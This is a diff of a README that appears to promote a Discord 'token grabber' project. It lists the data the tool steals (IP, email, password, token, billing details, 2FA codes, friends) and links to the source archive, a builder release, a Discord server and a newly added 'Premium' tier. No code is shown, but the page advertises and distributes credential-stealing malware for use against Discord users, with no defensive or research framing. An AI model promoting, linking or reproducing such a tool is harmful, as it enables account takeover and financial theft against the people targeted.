@@ -2,7 +2,7 @@
 
 ``Info``
 __IP,Username.ID,Nitro,Badges,Billing,Email,Password,Token,2faCodes,Friends__
-#### ``-`` [Discord Link](https://discord.gg/Sh236kfpvK) ``-`` [Source](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER/archive/refs/heads/main.zip) ``-`` [Builder](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER/releases/tag/Builder)
+#### ``-`` [Discord Link](https://discord.gg/Sh236kfpvK) ``-`` [Source](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER/archive/refs/heads/main.zip) ``-`` [Builder](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER/releases/tag/Builder) ``-`` [Premium](https://discord.gg/Sh236kfpvK) ``-`` [Features](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER#features)
 
 
 ![150866241-de6b2d67-9d5b-49b5-8817-2afb89b85e53](https://user-images.githubusercontent.com/98334039/151015014-16443b63-819d-4427-889f-06ae854d1b98.png)
